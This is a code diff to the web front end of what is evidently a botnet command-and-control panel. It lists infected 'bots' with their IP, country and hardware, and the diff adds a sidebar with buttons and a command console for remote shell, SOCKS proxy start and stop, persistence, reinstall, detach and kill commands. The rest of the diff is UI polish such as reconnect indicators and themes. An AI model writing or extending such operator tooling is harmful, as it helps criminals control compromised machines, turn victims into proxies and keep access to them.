@@ -134,9 +134,21 @@ function connectSSE() {
   };
 }
 
+var _sseRedTimer = null;
 function updateSSEIndicator(connected) {
+  clearTimeout(_sseRedTimer);
   var el = document.getElementById('sse-dot');
-  if (el) { el.className = 'sse-indicator ' + (connected ? 'sse-connected' : 'sse-disconnected'); el.title = connected ? 'Live connection' : 'Reconnecting...'; }
+  if (!el) return;
+  if (connected) {
+    el.className = 'sse-indicator sse-connected';
+    el.title = 'Live connection';
+  } else {
+    // Grace period before showing red — normal reconnect cycles stay green
+    _sseRedTimer = setTimeout(function () {
+      el.className = 'sse-indicator sse-disconnected';
+      el.title = 'Reconnecting...';
+    }, 3000);
+  }
 }
 
 function startPolling() {
@@ -243,7 +255,7 @@ function updateBots(bots) {
     var rowId = 'bot-' + sanitizeId(b.botID);
     var row = document.getElementById(rowId);
     if (!row) { row = createBotRow(b); tbody.appendChild(row); }
-    else if (botChanged(existing, b)) { updateBotRow(row, b); }
+    else if (botChanged(existing, b)) { updateBotRow(row, b); refreshSidebarIfOpen(b.botID); }
   });
 
   botState = newState;
@@ -263,7 +275,7 @@ function addOrUpdateBot(b) {
   var row = document.getElementById(rowId);
   var tbody = document.getElementById('bot-tbody');
   if (!row) { row = createBotRow(b); tbody.appendChild(row); }
-  else { updateBotRow(row, b); }
+  else { updateBotRow(row, b); refreshSidebarIfOpen(b.botID); }
   window._bots = botState;
   updateBotCount();
   buildFilterPanel();
@@ -276,6 +288,7 @@ function removeBot(botID) {
   botOrder = botOrder.filter(function (id) { return id !== botID; });
   var row = document.getElementById('bot-' + sanitizeId(botID));
   if (row) row.remove();
+  if (_sidebarBotID === botID) closeBotSidebar();
   window._bots = botState;
   updateBotCount(); renderSocksDash(); updateMultiSelectBar(); updateGroupStats();
 }
@@ -287,8 +300,15 @@ function updateBotSocks(d) {
   b.socksUser = d.socksUser || ''; b.socksStarted = d.socksStarted || '';
   botState[d.botID] = b; window._bots = botState;
   var row = document.getElementById('bot-' + sanitizeId(d.botID));
-  if (row) updateBotRow(row, b);
+  if (row) { updateBotRow(row, b); refreshSidebarIfOpen(b.botID); }
   renderSocksDash();
+}
+
+function refreshSidebarIfOpen(botID) {
+  if (_sidebarBotID && _sidebarBotID === botID) {
+    var b = window._bots && window._bots[botID];
+    if (b) renderBotSidebar(b);
+  }
 }
 
 function botChanged(a, b) {
@@ -315,7 +335,8 @@ function createBotRow(b) {
   tr.className = 'bot-row';
   tr.id = 'bot-' + sanitizeId(b.botID);
   tr.setAttribute('data-botid', b.botID);
-  tr.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; pinBotPopup(ev, b.botID); };
+  tr.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; openBotSidebar(b.botID); };
+  tr.oncontextmenu = function (ev) { ev.preventDefault(); pinBotPopup(ev, b.botID); };
   tr.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
 
   var socksHtml = b.socksActive
@@ -361,7 +382,8 @@ function updateBotRow(row, b) {
   cells[12].className = h.cls;
   cells[12].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
   row.className = 'bot-row ' + h.row;
-  row.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; pinBotPopup(ev, b.botID); };
+  row.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; openBotSidebar(b.botID); };
+  row.oncontextmenu = function (ev) { ev.preventDefault(); pinBotPopup(ev, b.botID); };
   row.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
 }
 
@@ -765,6 +787,101 @@ document.addEventListener('click', function (e) {
   var p = document.getElementById('bot-popup');
   if (!p.contains(e.target) && !e.target.closest('.bot-row')) { closeBotPopup(); }
 });
+
+// ---------------------------------------------------------------------------
+// Bot detail sidebar (left-click)
+// ---------------------------------------------------------------------------
+
+var _sidebarBotID = '';
+
+function openBotSidebar(botID) {
+  var b = window._bots && window._bots[botID]; if (!b) return;
+  _sidebarBotID = botID;
+  renderBotSidebar(b);
+  document.getElementById('bds-title').textContent = botID;
+  document.getElementById('bot-detail-sidebar').classList.add('open');
+}
+
+function closeBotSidebar() {
+  _sidebarBotID = '';
+  document.getElementById('bot-detail-sidebar').classList.remove('open');
+}
+
+function bdsSendCmd(botID, cmd) {
+  if (!cmd) {
+    var inp = document.getElementById('bds-cmd-input');
+    if (!inp) return;
+    cmd = inp.value.trim();
+    if (!cmd) return;
+    inp.value = '';
+  }
+  popupCmd(botID, cmd);
+}
+
+function renderBotSidebar(b) {
+  var id = b.botID.replace(/'/g, "\\'");
+  var eid = escHtml(b.botID);
+  var socksColor = b.socksActive ? 'var(--green)' : 'var(--text-dim)';
+  var socksLabel = b.socksActive ? 'ACTIVE' : 'OFFLINE';
+
+  // ── Identity & hardware info ────────────────────────────────────────────
+  var info =
+    '<div class="isb-row"><span class="isb-label">Bot ID</span><span class="isb-val" style="color:var(--blue)">' + eid + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">IP</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">Country</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
+    (b.group ? '<div class="isb-row"><span class="isb-label">Group</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.group) + '</span></div>' : '') +
+    '<div class="isb-divider"></div>' +
+    '<div class="isb-row"><span class="isb-label">Arch</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">RAM</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">CPU</span><span class="isb-val">' + b.cpuCores + ' cores</span></div>' +
+    '<div class="isb-row"><span class="isb-label">Uplink</span><span class="isb-val">' + (b.uplinkMbps ? b.uplinkMbps.toFixed(1) + ' Mbps' : '—') + '</span></div>' +
+    '<div class="isb-divider"></div>' +
+    '<div class="isb-row"><span class="isb-label">Process</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">Uptime</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">Last Ping</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
+    '<div class="isb-divider"></div>' +
+    '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + socksColor + '">' + socksLabel + '</span></div>' +
+    (b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '') +
+    (b.socksUser  ? '<div class="isb-row"><span class="isb-label">SOCKS User</span><span class="isb-val">' + escHtml(b.socksUser) + '</span></div>' : '') +
+    (b.socksStarted ? '<div class="isb-row"><span class="isb-label">Since</span><span class="isb-val">' + ago(b.socksStarted) + '</span></div>' : '');
+
+  // ── Quick actions ────────────────────────────────────────────────────────
+  var socksToggle = b.socksActive
+    ? '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop SOCKS</button>'
+    : '<button class="bds-btn" onclick="popupStartSocks(\'' + id + '\')">Start SOCKS</button>';
+
+  var actions =
+    '<div class="bds-section">' +
+    '<div class="bds-section-title">Actions</div>' +
+    '<div class="bds-action-grid">' +
+    '<button class="bds-btn bds-shell" onclick="openShell(\'' + id + '\')">Shell</button>' +
+    socksToggle +
+    '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!persist\')">Persist</button>' +
+    '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!reinstall\')">Reinstall</button>' +
+    '<button class="bds-btn" onclick="popupSetGroup(\'' + id + '\')">Set Group</button>' +
+    '<button class="bds-btn bds-kill" onclick="popupKill(\'' + id + '\')">Kill</button>' +
+    '</div></div>';
+
+  // ── Command console ──────────────────────────────────────────────────────
+  var console_ =
+    '<div class="bds-section">' +
+    '<div class="bds-section-title">Send Command</div>' +
+    '<div class="bds-cmd-row">' +
+    '<input class="bds-cmd-input" id="bds-cmd-input" placeholder="!shell ls -la, !detach ..." ' +
+      'onkeydown="if(event.key===\'Enter\')bdsSendCmd(\'' + id + '\')">' +
+    '<button class="bds-btn" style="flex-shrink:0" onclick="bdsSendCmd(\'' + id + '\')">Send</button>' +
+    '</div>' +
+    '<div class="bds-cmd-chips">' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!shell \'">!shell</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!detach \'">!detach</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!stream \'">!stream</span>' +
+    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!stopsocks\')">!stopsocks</span>' +
+    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!persist\')">!persist</span>' +
+    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!reinstall\')">!reinstall</span>' +
+    '</div></div>';
+
+  document.getElementById('bds-body').innerHTML = info + actions + console_;
+}
 
 // ---------------------------------------------------------------------------
 // Popup commands
@@ -1492,8 +1609,15 @@ function activateShellTab(idx) {
   };
   shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
 
-  // Auto-refresh file listing
-  setTimeout(function () { refreshFiles(); }, 500);
+  shellWS.onopen = function () {
+    if (!saved) {
+      // New session — navigate to / so file tree shows full filesystem root
+      shellWS.send(JSON.stringify({ command: 'cd /' }));
+    } else {
+      // Restored session — repopulate file browser for the saved cwd
+      setTimeout(function () { refreshFiles(); }, 100);
+    }
+  };
 }
 
 function switchShellTab(idx) {
@@ -2519,7 +2643,21 @@ function deleteUser(username) {
 // Theme toggle
 // ---------------------------------------------------------------------------
 
+var _globalThemeProps = ['--bg-base','--bg-primary','--bg-card','--bg-card-hover','--bg-input',
+  '--bg-elevated','--border','--border-light','--text','--text-muted','--text-dim',
+  '--accent','--accent-hover','--green','--red','--yellow','--blue','--cyan','--header-bg'];
+
+function clearGlobalThemeVars() {
+  var r = document.documentElement;
+  _globalThemeProps.forEach(function (p) { r.style.removeProperty(p); });
+  document.body.style.background = '';
+  try { localStorage.removeItem('vision_global_theme'); } catch (e) {}
+  var picker = document.getElementById('global-theme-picker');
+  if (picker) picker.value = '';
+}
+
 function applyTheme(theme) {
+  clearGlobalThemeVars();
   document.documentElement.setAttribute('data-theme', theme);
   var btn = document.getElementById('theme-toggle');
   if (btn) {
@@ -2774,6 +2912,8 @@ wizardInit();
 // GLOBAL PANEL THEMES
 // ===========================================================================
 var GLOBAL_THEMES = {
+  light:     { name:'Light',           _dataTheme:'light' },
+  dark:      { name:'Dark',            _dataTheme:'dark' },
   default:   { name:'Default (Dark)',  bgBase:'#06080c', bgPrimary:'#0c1018', bgCard:'#111827', bgCardHover:'#1a2332', bgInput:'#0f1520', bgElevated:'#182234', border:'#1e2d3d', borderLight:'#253344', text:'#e2e8f0', textMuted:'#64748b', textDim:'#475569', accent:'#8b5cf6', accentHover:'#7c3aed', green:'#22c55e', red:'#ef4444', yellow:'#eab308', blue:'#3b82f6', cyan:'#06b6d4', headerBg:'rgba(12,16,24,0.8)' },
   monokai:   { name:'Monokai',         bgBase:'#1a1a17', bgPrimary:'#272822', bgCard:'#2e2f28', bgCardHover:'#3a3b32', bgInput:'#1e1f1a', bgElevated:'#3e3d32', border:'#49483e', borderLight:'#5a5949', text:'#f8f8f2', textMuted:'#a59f85', textDim:'#75715e', accent:'#f92672', accentHover:'#e6195f', green:'#a6e22e', red:'#f92672', yellow:'#e6db74', blue:'#66d9ef', cyan:'#a1efe4', headerBg:'rgba(39,40,34,0.9)' },
   dracula:   { name:'Dracula',         bgBase:'#1e1f29', bgPrimary:'#282a36', bgCard:'#2d2f3d', bgCardHover:'#343746', bgInput:'#21222c', bgElevated:'#383a4a', border:'#44475a', borderLight:'#555869', text:'#f8f8f2', textMuted:'#8a8ea0', textDim:'#6272a4', accent:'#bd93f9', accentHover:'#a87cf5', green:'#50fa7b', red:'#ff5555', yellow:'#f1fa8c', blue:'#8be9fd', cyan:'#8be9fd', headerBg:'rgba(40,42,54,0.9)' },
@@ -2784,8 +2924,17 @@ var GLOBAL_THEMES = {
 
 function applyGlobalTheme(name) {
   var t = GLOBAL_THEMES[name]; if (!t) return;
+  // Light/Dark entries delegate to data-theme rather than inline vars
+  if (t._dataTheme) {
+    applyTheme(t._dataTheme);
+    try { localStorage.setItem('vision-theme', t._dataTheme); localStorage.setItem('vision_global_theme', name); } catch (e) {}
+    var pk = document.getElementById('global-theme-picker');
+    if (pk) pk.value = name;
+    return;
+  }
   var r = document.documentElement;
   r.removeAttribute('data-theme');
+  try { localStorage.removeItem('vision-theme'); } catch (e) {}
   r.style.setProperty('--bg-base', t.bgBase);
   r.style.setProperty('--bg-primary', t.bgPrimary);
   r.style.setProperty('--bg-card', t.bgCard);
